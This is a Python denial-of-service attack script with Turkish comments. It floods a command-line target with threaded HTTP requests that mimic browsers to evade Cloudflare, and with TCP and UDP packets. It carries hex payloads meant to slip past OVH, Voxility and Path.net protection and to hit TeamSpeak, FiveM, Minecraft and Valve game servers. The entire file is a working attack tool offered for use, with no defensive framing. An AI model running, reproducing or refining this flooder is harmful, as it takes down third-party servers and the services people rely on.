#!/usr/bin/env python3
import socket, random, sys, time, threading, ssl, os

# --- USTALIK ESERİ: ÖZEL HEX & BYPASS MATRİSİ ---
# Senin gönderdiğin "zırh delici" hexler ve benim özel eklemelerim.
HEX_DATA = {
    # --- TCP & HOSTING ÖZEL ---
    "ovh":        bytes.fromhex("01000000000000000800000000000000"), # Full Handshake
    "ovh-slam":   bytes.fromhex("00000000040000000100000005000000"), # Slam Bypass
    "vox-bypass": bytes.fromhex("000000110900000000000000"), # Voxility Filter-In
    "tcpbl":      bytes.fromhex("000000000000000000000000"), # RAW SYN-ACK
    "tcp-rape":   bytes.fromhex("5800000000000000000000000000000052455155455354"), # Request Flood
    "socket":     bytes.fromhex("21000000000000000000000000000000"), # Socket Null
    
    # --- GAME & PROTOCOL ÖZEL ---
    "path-net":   bytes.fromhex("ffffffff54536f7572636520456e67696e6520517565727900"), # Valve Query
    "ts3-init":   bytes.fromhex("05ca7f169c11f9f654"), # TS3 Handshake 1
    "ts3-vox":    bytes.fromhex("0000002c000000000000000502040b02"), # Vox TS3 Bypass
    "fivem":      bytes.fromhex("ffffffff6900000000000000"), # FiveM Query Auth
    "minecraft":  bytes.fromhex("fe01fa000b004d0043007c00500069006e00670048006f00730074"), # MC Ping
    "discord":    bytes.fromhex("54533355535200010000000000000000"), # Discord UDP Mock
}

# --- LAYER 7 BYPASS (HTTP/2 & CLOUDFLARE) ---
def l7_bypass(target, duration, method):
    host = target.replace("http://", "").replace("https://", "").split("/")[0]
    port = 443 if "https" in target else 80
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if port == 443:
                s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            
            # Browser Emulation (User-Agent & Cookies)
            req = f"GET /?{random.randint(1,999)} HTTP/1.1\r\n" \
                  f"Host: {host}\r\n" \
                  f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(110,124)}.0.0.0 Safari/537.36\r\n" \
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" \
                  "Connection: keep-alive\r\n\r\n"
            s.send(req.encode())
            s.close()
        except: pass

# --- LAYER 4 BYPASS (TCP/UDP) ---
def l4_bypass(target, port, duration, method):
    timeout = time.time() + duration
    payload = HEX_DATA.get(method, random._urandom(1024))
    
    while time.time() < timeout:
        try:
            if "udp" in method or method in ["ts3-init", "fivem", "discord", "udpb3"]:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # udpbypass ise Path.net için paket boyutunu salla
                final_p = payload if method != "udpbypass" else random._urandom(random.randint(64, 1400))
                s.sendto(final_p, (target, port))
            else: # TCP Metodları (Vox, Ovh, StormWall)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(1)
                s.connect((target, port))
                s.send(payload)
                s.close()
        except: pass

if __name__ == "__main__":
    if len(sys.argv) < 6: sys.exit()
    method, target, port, threads, duration = sys.argv[1].lower(), sys.argv[2], int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5])

    print(f"🚀 ORDULAR İLERİ! Hedef: {target} | Metod: {method.upper()}")

    for _ in range(threads):
        # L7 metodlarını ayıkla
        if method in ["http-delta", "http-tls", "cloudflare", "browser", "http-kill"]:
            threading.Thread(target=l7_bypass, args=(target, duration, method), daemon=True).start()
        else:
            threading.Thread(target=l4_bypass, args=(target, port, duration, method), daemon=True).start()
    
    time.sleep(duration)
    print("🏁 Görev bitti.")
